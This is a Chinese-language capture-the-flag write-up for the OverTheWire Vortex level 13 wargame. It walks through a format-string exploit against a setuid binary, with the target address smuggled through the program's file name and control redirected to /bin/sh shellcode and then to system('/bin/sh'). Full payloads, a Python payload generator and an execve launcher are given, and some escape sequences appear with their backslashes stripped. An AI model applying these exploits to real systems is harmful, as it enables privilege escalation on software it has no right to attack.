---
title: OverTheWire Vertex Level 13 → Level 14
author: Ripples
layout: post
permalink: /overthewire-vertex-level-13/
views:
  - 260
categories:
  - CTF
tags:
  - buffer overflow
  - reversing
  - vortex
  - wargame
  - WriteUp
---
<p style="text-indent: 2em;">
  由于要当码农，已经好几天没有时间做vortex了，现在刚有了点时间，回来继续奋战，结果真是被虐的一塌糊涂。
</p>

<p style="text-indent: 2em;">
  原题参见<a href="http://overthewire.org/wargames/vortex/vortex13.html" target="_blank">这里</a>。
</p>

<p style="text-indent: 2em;">
  首先还是逆向，得到仿写的程序如下：
</p>

<!--more-->

<pre class="brush:cpp;toolbar:false">char&nbsp;*allowed&nbsp;=&nbsp;"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%.$x0A";

void&nbsp;vuln()
{
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;size&nbsp;=&nbsp;0x14;
&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*s&nbsp;=&nbsp;malloc(size);
&nbsp;&nbsp;&nbsp;&nbsp;fgets(s,&nbsp;size,&nbsp;stdin);
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;=&nbsp;0x13;&nbsp;++i)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!strchr(allowed,&nbsp;s[i]))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;printf(s);
&nbsp;&nbsp;&nbsp;&nbsp;free(s);
}

int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;*argv[])
{
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(argc&nbsp;!=&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(1);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;extern&nbsp;char&nbsp;**environ;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(char&nbsp;**p&nbsp;=&nbsp;environ;&nbsp;*p;&nbsp;++p)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(char&nbsp;*s&nbsp;=&nbsp;p;&nbsp;*s;&nbsp;++s)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*s&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(char&nbsp;**p&nbsp;=&nbsp;argv;&nbsp;*p;&nbsp;++p)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(char&nbsp;*s&nbsp;=&nbsp;p;&nbsp;*s;&nbsp;++s)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*s&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;vuln();
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
}</pre>

<p style="text-indent: 2em;">
  看到这个程序，真的是不得不说，这也太狠了点吧，清空了参数和环境变量，然后只给了19个字符的输入空间，这19个字符的取值范围还被限定了，要通过这19个字符来控制程序，还是不可运行的栈，这真是shellcode也不止这点长度了。反正如果就我个人看到的第一感而言，这程序保护的简直无懈可击。
</p>

<p style="text-indent: 2em;">
  这个程序想来应该很明确是通过printf的格式化字符串溢出攻击，但通过这19个字符我们应该使程序跳到哪里去却是一个巨大的问题。
</p>

<p style="text-indent: 2em;">
  仔细观察程序，我们会发现，我们可以跳转到char *s = malloc(size)这一句那里，然后在跳转之前，我们先修改好size，这样，程序就会再次运行vuln，为我们开辟出一块更大的空间，突破了长度的限制。然后，由于在strchr的检查循环中，固定是i <= 0<a></a>x13而不是i < size，这样，我们就可以在20个字符后面接上非allowed中的字符了，看起来似乎柳暗花明了。
</p>

<p style="text-indent: 2em;">
  然而，printf的格式化字符串溢出，需要在栈中某个地方存储修改的目标地址，可是argv和env全都被清空了，如何将地址传递进来成了最大的问题，迈不出这第一步，一切想法都是浮云。
</p>

<p style="text-indent: 2em;">
  在纠结了N久之后，终于发现，除了argv和env，其实还有一个东西能把数据传进去，只是一直被忽略了，那就是在env后面，还存储了一份文件名，而linux下，文件名几乎可以为任意字符。这样，我们就可以通过文件名来携带我们需要的不可见字符了。
</p>

<p style="text-indent: 2em;">
  首先在文件名后加上16个0xff，gdb后发现，为了对齐，需要在最后再加3个字符。然后vuln的栈桢ebp为0xffffde38，文件名的第一个0xffffffff地址为0xffffdfe4，可以计算出，printf的时候，%117$对应着这个0xffffffff，我们也可以通过运行程序后输入%117$8x来测试。
</p>

<p style="text-indent: 2em;">
  然后，查看到我们需要跳转到的目标地址为0<a></a>x08048551，而printf本身的返回地址为0x080485d7，那么为了节省格式化字符串的长度，我们只需要能修改最后一个字节即可，但是由于最少为%hn，即我们需要修改最后两个字节。
</p>

<p style="text-indent: 2em;">
  首先修改运行程序名：
</p>

<pre class="brush:bash;toolbar:false">cp&nbsp;./vortex13&nbsp;`python&nbsp;-c&nbsp;&#39;print&nbsp;"vortex"&nbsp;+&nbsp;"x0cxdexffxffx28xdexffxff"&nbsp;+&nbsp;"a"&nbsp;*&nbsp;11&#39;`</pre>

<p style="text-indent: 2em;">
  其中0xffffde0c的位置上存储着printf的返回地址，0xffffde28的位置上存储着size。
</p>

<p style="text-indent: 2em;">
  这样想要修改返回地址，我们需要输入%34129x%117$hn，修改size，我们需要输入%118$n，这样最终得到输入字符串为：
</p>

<pre class="brush:plain;toolbar:false;">%34129x%117$hn%118$n</pre>

<p style="text-indent: 2em;">
  然而，数完长度之后，瞬间有种要崩溃的即视感，竟然不多不少，正好20个字符，超出限制的19个字符一个字符，而这个长度已经极限了，那么也就是说，我们这个方案告吹。
</p>

<p style="text-indent: 2em;">
  再仔细观察fgets(s, size, stdin)对应的汇编代码：
</p>

<pre class="brush:plain;toolbar:false;">&nbsp;&nbsp;&nbsp;0x804855f&nbsp;&lt;vuln+27&gt;:	mov&nbsp;&nbsp;&nbsp;&nbsp;0x804a030,%eax
&nbsp;&nbsp;&nbsp;0x8048564&nbsp;&lt;vuln+32&gt;:	mov&nbsp;&nbsp;&nbsp;&nbsp;%eax,%edx
&nbsp;&nbsp;&nbsp;0x8048566&nbsp;&lt;vuln+34&gt;:	mov&nbsp;&nbsp;&nbsp;&nbsp;-0x10(%ebp),%eax
&nbsp;&nbsp;&nbsp;0x8048569&nbsp;&lt;vuln+37&gt;:	mov&nbsp;&nbsp;&nbsp;&nbsp;%edx,0x8(%esp)
&nbsp;&nbsp;&nbsp;0x804856d&nbsp;&lt;vuln+41&gt;:	mov&nbsp;&nbsp;&nbsp;&nbsp;%eax,0x4(%esp)
&nbsp;&nbsp;&nbsp;0x8048571&nbsp;&lt;vuln+45&gt;:	mov&nbsp;&nbsp;&nbsp;&nbsp;-0xc(%ebp),%eax
&nbsp;&nbsp;&nbsp;0x8048574&nbsp;&lt;vuln+48&gt;:	mov&nbsp;&nbsp;&nbsp;&nbsp;%eax,(%esp)
&nbsp;&nbsp;&nbsp;0x8048577&nbsp;&lt;vuln+51&gt;:	call&nbsp;&nbsp;&nbsp;0x8048430&nbsp;&lt;fgets@plt&gt;</pre>

<p style="text-indent: 2em;">
  我们只要跳到0x804856d处，fgets的长度限制就会变，至于变成多少，就要看跳转过来时eax的状况了，而实际情况中，这个时候eax的值不小。但是这样我们确实把fgets的size参数改掉了，但同时，我们也丢失了fgets的第三个参数stream，但仔细观察程序+gdb，我们会惊喜的发现，后面的函数都没有用到第三个参数的位置，那么也就是说，只要我们不修改，第三个参数应该和上一次fgets的时候一样，这正如我们所愿。
</p>

<p style="text-indent: 2em;">
  于是乎，通过以下输入：
</p>

<pre class="brush:plain;toolbar:false">%34157x%117$hn
%34129x%117$hn%118$n</pre>

<p style="text-indent: 2em;">
  我们完全控制了我们可以输入的字符长度。
</p>

<p style="text-indent: 2em;">
  由于栈不可运行，我们将shellcode通过第三次输入，放到堆中，然后跳转执行即可。
</p>

<p style="text-indent: 2em;">
  通过gdb，得到第一次malloc分配出来的地址为0x0804b008，第二次为0x0804b020，于是得到输入如下：
</p>

<pre class="brush:plain;toolbar:false">%34157x%117$hn
%34129x%117$hn%118$n
%45108x%117$hnaaaaaa{shellcode}</pre>

<p style="text-indent: 2em;">
  其中，45108=0xb034，而shellcode的起始地址为0x0804b034，运行：
</p>

<pre class="brush:bash;toolbar:false">cp&nbsp;/vortex/vortex13&nbsp;`python&nbsp;-c&nbsp;&#39;print&nbsp;"/tmp/vortex"&nbsp;+&nbsp;"x0cxdexffxffx28xdexffxff"&nbsp;+&nbsp;"a"&nbsp;*&nbsp;11&#39;`
./generate.py&nbsp;&gt;&nbsp;payload
cat&nbsp;payload&nbsp;|&nbsp;./startup</pre>

<p style="text-indent: 2em;">
  generate.py：
</p>

<pre class="brush:python;toolbar:false">#!/usr/bin/env&nbsp;python

shellcode&nbsp;=&nbsp;"jx0bXx991xc9Rh//shh/binx89xe3xcdx80"
print(&#39;%34157x%117$hn&#39;)
print(&#39;%34129x%117$hn%118$n&#39;)
print(&#39;%45108x%117$hn&#39;&nbsp;+&nbsp;&#39;aaaaaa&#39;&nbsp;+&nbsp;shellcode)</pre>

<p style="text-indent: 2em;">
  startup.c：
</p>

<pre class="brush:cpp;toolbar:false">#include&nbsp;&lt;unistd.h&gt;

int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;*argv[])
{
&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*arg[]&nbsp;=&nbsp;{NULL};
&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*env[]&nbsp;=&nbsp;{NULL};
&nbsp;&nbsp;&nbsp;&nbsp;execve("/tmp/vortex""x0cxdexffxffx28xdexffxff""aaa",&nbsp;arg,&nbsp;env);
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
}</pre>

<p style="text-indent: 2em;">
  然而，运行后，结果并不如所愿，竟然崩溃了，最后无奈的发现，堆也是不可运行的。
</p>

<p style="text-indent: 2em;">
  于是乎，我们采用和上关一样的方式，调用system("/bin/sh")，system地址为0xf7e67280，利用输入传入字符串/bin/sh，得到payload如下：
</p>

<pre class="brush:plain;toolbar:false">%34157x%117$hn
%29312x%117$hn%34150x%118$hn%47194x%119$hn%22468x%120$hn/bin/sh</pre>

<pre class="brush:bash;toolbar:false">cp&nbsp;/vortex/vortex13&nbsp;`python&nbsp;-c&nbsp;&#39;print&nbsp;"/tmp/vortex"&nbsp;+&nbsp;"x0cxdexffxffx0exdexffxffx14xdexffxffx16xdexffxffaaa"&#39;`</pre>

<p style="text-indent: 2em;">
  startup.c：
</p>

<pre class="brush:cpp;toolbar:false">#include&nbsp;&lt;unistd.h&gt;

int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;*argv[])
{
&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*arg[]&nbsp;=&nbsp;{NULL};
&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;*env[]&nbsp;=&nbsp;{NULL};
&nbsp;&nbsp;&nbsp;&nbsp;execve("/tmp/vortex""x0cxdexffxffx0exdexffxffx14xdexffxffx16xdexffxff""aaa",&nbsp;arg,&nbsp;env);
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
}</pre>

<p style="text-indent: 2em;">
  这样，运行startup，输入payload，我们成功拿到shell。然而，不幸再次降临，我们拿到的shell是没有权限的，稍微一想便会发现，由于我们的cp命令，文件已经变了，权限没了，一切都白瞎。
</p>

<p style="text-indent: 2em;">
  思前想后，想用链接，然而，创建硬链接会得到如下错误：
</p>

<pre class="brush:plain;toolbar:false">ln:&nbsp;failed&nbsp;to&nbsp;create&nbsp;hard&nbsp;link&nbsp;`/tmp/vortexf336377377 16336377377 24336377377 26336377377aaa&#39;&nbsp;=&gt;&nbsp;`/vortex/vortex13&#39;:&nbsp;Invalid&nbsp;cross-device&nbsp;link</pre>

<p style="text-indent: 2em;">
  那就只能创建软链接了（不过软链接似乎在某些情况下，gdb进去会发现运行程序名还是/vortex/vortex13），反正至少用startup调用的时候不会，这样，我们就成功拿到shell。
</p>

<p style="text-indent: 2em;">
  本题虽然解决的不是很满意，但在被虐了N久之后，至少勉强也算过了。
</p>
